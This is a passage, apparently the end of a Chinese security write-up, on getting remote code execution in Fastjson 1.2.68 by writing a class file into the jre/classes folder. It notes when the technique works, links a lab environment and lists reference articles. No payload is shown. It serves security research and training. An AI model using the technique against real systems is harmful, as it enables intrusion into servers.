![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1697773505975-9dc4f09d-5b0d-4500-a38e-67e5f6b53900.png#averageHue=%23cdbe9b&clientId=u488ca4a9-9f3a-4&from=paste&height=115&id=ud01c3747&originHeight=144&originWidth=883&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=7807&status=done&style=none&taskId=u0fceb00e-405c-49b6-ad4e-60bce61fee0&title=&width=706.4)

这样就相对来说更加优雅了。所以从某种角度来看，在这个大版本下或许比1.2.47以下更方便利用。但是也会有限制，首先关于jre/classes这个文件夹，若是在项目启动后创建classes文件夹并不会加载我们写入的class文件，这种情况下只能等到项目重新启动才可。



FastJsonParty对应环境：[1268-writefile-no-network](https://github.com/lemono0/FastJsonParty/tree/main/1268-writefile-no-network) 

## Reference
Commons IO 2.x 写文件利用链挖掘分析：[https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg](https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg)
写文件RCE：[https://mp.weixin.qq.com/s/HMlaMPn4LK3GMs3RvK6ZRA](https://mp.weixin.qq.com/s/HMlaMPn4LK3GMs3RvK6ZRA)
三梦：[https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/](https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/)
[https://mp.weixin.qq.com/s/WbYi7lPEvFg-vAUB4Nlvew](https://mp.weixin.qq.com/s/WbYi7lPEvFg-vAUB4Nlvew)
[https://forum.butian.net/share/1623](https://forum.butian.net/share/1623)
